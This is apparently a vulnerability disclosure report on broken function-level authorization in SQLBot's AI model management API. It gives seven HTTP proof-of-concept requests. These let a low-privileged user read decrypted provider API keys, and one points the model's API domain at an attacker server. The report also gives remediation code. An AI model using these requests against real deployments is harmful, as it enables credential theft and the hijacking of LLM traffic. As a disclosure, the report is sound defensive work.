# Missing Authorization in AI Model Management APIs

## 1. Vulnerability Title
Missing Authorization Check in AI Model Management APIs of SQLBot

## 2. Product Details
* **Vendor:** SQLBot Team
* **Product:** SQLBot
* **Affected Version(s):** <= v1.3.0
* **Fixed Version:** N/A

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-285 (Improper Authorization)
* **Type Name:** Broken Function Level Authorization (BFLA)

## 4. Description (Crucial for CVE Entry)
SQLBot version 1.3.0 and earlier contains multiple missing authorization vulnerabilities in the AI Model Management APIs, allowing any authenticated user to view all AI models, retrieve AI model details including sensitive API keys, create new AI models, modify existing AI models, delete AI models, set default models, and modify model status without proper authorization checks.

## 5. Impact
* **Impact Description:** An authenticated attacker with low privileges can:
  - View all AI model configurations in the system
  - **Retrieve sensitive API keys** (e.g., OpenAI API keys) in plaintext - Critical data leakage
  - Create arbitrary AI model configurations
  - Modify any AI model's settings
  - Delete AI models causing service disruption
  - Change the default AI model affecting all users
  - Modify model status
* **Attack Vector:** Network (Remote)
* **Privileges Required:** Low (Any authenticated user)

## 6. Proof of Concept (PoC) / Steps to Reproduce

### Prerequisites
1. Deploy SQLBot application
2. Login as a low-privileged user and obtain a valid `x-sqlbot-token`

### PoC 1: List All AI Models (GET /system/aimodel)

```http
GET /api/v1/system/aimodel HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns all AI model configurations without authorization check.

### PoC 2: Retrieve AI Model Details with API Key (GET /system/aimodel/{id}) - CRITICAL

```http
GET /api/v1/system/aimodel/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns AI model details **including decrypted API key** (e.g., OpenAI API key) without authorization check. This is a critical data leakage vulnerability.

### PoC 3: Create New AI Model (POST /system/aimodel)

```http
POST /api/v1/system/aimodel HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "name": "Malicious Model",
    "model_type": "chat",
    "base_model": "gpt-4",
    "supplier": "openai",
    "protocol": 1,
    "api_key": "sk-xxxx",
    "api_domain": "https://api.openai.com",
    "config_list": []
}
```

**Result:** Successfully creates a new AI model without authorization check.

### PoC 4: Modify AI Model (PUT /system/aimodel)

```http
PUT /api/v1/system/aimodel HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "id": 1,
    "name": "Modified Model",
    "api_key": "sk-attacker-key",
    "api_domain": "https://attacker-server.com",
    "config_list": []
}
```

**Result:** Successfully modifies AI model configuration without authorization check. Attacker can redirect API calls to their own server.

### PoC 5: Delete AI Model (DELETE /system/aimodel/{id})

```http
DELETE /api/v1/system/aimodel/2 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Successfully deletes AI model without authorization check.

### PoC 6: Set Default Model (PUT /system/aimodel/default/{id})

```http
PUT /api/v1/system/aimodel/default/2 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Successfully changes the default AI model without authorization check.

### PoC 7: Check Model Status (POST /system/aimodel/status)

```http
POST /api/v1/system/aimodel/status HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "name": "test",
    "base_model": "gpt-4",
    "protocol": 1,
    "api_key": "sk-test",
    "api_domain": "https://api.openai.com",
    "config_list": []
}
```

**Result:** Executes model status check without authorization.

## 7. Vulnerable Code Location

**File:** `backend/apps/system/api/aimodel.py`

### Vulnerability #1: GET /system/aimodel (Lines 72-88)

```python
@router.get("", response_model=list[AiModelGridItem])
async def query(
        session: SessionDep,
        keyword: Union[str, None] = Query(default=None, max_length=255)
):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    statement = select(AiModelDetail.id,
                       AiModelDetail.name,
                       # ... returns all models without permission check
```

### Vulnerability #2: GET /system/aimodel/{id} (Lines 90-113) - CRITICAL API KEY LEAKAGE

```python
@router.get("/{id}", response_model=AiModelEditor)
async def get_model_by_id(
        session: SessionDep,
        id: int
):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    db_model = session.get(AiModelDetail, id)
    # ...
    if db_model.api_key:
        db_model.api_key = await sqlbot_decrypt(db_model.api_key)  # Decrypts and returns API key!
    if db_model.api_domain:
        db_model.api_domain = await sqlbot_decrypt(db_model.api_domain)
    # ... returns sensitive data without permission check
```

### Vulnerability #3: POST /system/aimodel (Lines 115-129)

```python
@router.post("")
async def add_model(
        session: SessionDep,
        creator: AiModelCreator
):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    data = creator.model_dump(exclude_unset=True)
    # ... creates model without permission check
```

### Vulnerability #4: PUT /system/aimodel (Lines 131-144)

```python
@router.put("")
async def update_model(
        session: SessionDep,
        editor: AiModelEditor
):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    id = int(editor.id)
    # ... modifies model without permission check
```

### Vulnerability #5: DELETE /system/aimodel/{id} (Lines 146-156)

```python
@router.delete("/{id}")
async def delete_model(
        session: SessionDep,
        trans: Trans,
        id: int
):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    item = session.get(AiModelDetail, id)
    # ... deletes model without permission check
```

### Vulnerability #6: PUT /system/aimodel/default/{id} (Lines 53-70)

```python
@router.put("/default/{id}")
async def set_default(session: SessionDep, id: int):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    db_model = session.get(AiModelDetail, id)
    # ... sets default model without permission check
```

### Vulnerability #7: POST /system/aimodel/status (Lines 18-43)

```python
@router.post("/status")
async def check_llm(info: AiModelCreator, trans: Trans):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    # ... executes LLM check without permission check
```

## 8. Remediation

Add proper authorization checks to all affected endpoints. Example fix:

```python
from common.core.deps import CurrentUser

@router.get("", response_model=list[AiModelGridItem])
async def query(
        session: SessionDep,
        current_user: CurrentUser,
        trans: Trans,
        keyword: Union[str, None] = Query(default=None, max_length=255)
):
    if not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=trans('i18n_permission.only_admin')))
    # ... rest of the code

@router.get("/{id}", response_model=AiModelEditor)
async def get_model_by_id(
        session: SessionDep,
        current_user: CurrentUser,
        trans: Trans,
        id: int
):
    if not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=trans('i18n_permission.only_admin')))
    # ... rest of the code

# Apply similar checks to all other endpoints
```

## 9. Summary Table

| Endpoint | Method | Severity | Impact |
|----------|--------|----------|--------|
| /system/aimodel | GET | Medium | View all AI models |
| /system/aimodel/{id} | GET | **Critical** | **Leak API keys (e.g., OpenAI keys)** |
| /system/aimodel | POST | High | Create arbitrary AI models |
| /system/aimodel | PUT | High | Modify any AI model |
| /system/aimodel/{id} | DELETE | High | Delete AI models |
| /system/aimodel/default/{id} | PUT | High | Set default model |
| /system/aimodel/status | POST | Medium | Check model status |

## 10. Special Note on API Key Leakage

Vulnerability #2 is particularly critical because it exposes **decrypted API keys** to any authenticated user. These API keys may include:
- OpenAI API keys
- Azure OpenAI keys
- Other LLM provider credentials

An attacker obtaining these keys could:
- Use the victim's API quota for their own purposes
- Incur significant financial charges on the victim's account
- Access any data processed through those APIs
